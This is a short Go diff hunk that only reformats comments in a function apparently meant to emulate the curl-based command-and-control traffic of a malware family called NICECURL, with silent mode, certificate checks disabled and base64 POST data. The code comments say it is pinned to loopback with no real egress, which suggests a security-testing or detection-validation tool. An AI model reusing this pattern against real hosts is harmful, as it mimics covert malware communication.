@@ -226,8 +226,8 @@ func performTechnique() error {
 		// -X POST with base64-encoded data
 		// -H with custom headers
 		cmd := exec.Command(curlPath,
-			"-s", // Silent mode
-			"-k", // Allow self-signed certs (NICECURL does this)
+			"-s",                                     // Silent mode
+			"-k",                                     // Allow self-signed certs (NICECURL does this)
 			"--resolve", c2ResolveFlag(endpoint.url), // SAFETY: pin to loopback, no real egress
 			"--connect-timeout", "5", // Short timeout (connection to loopback:443 is refused)
 			"--max-time", "8", // Max total time
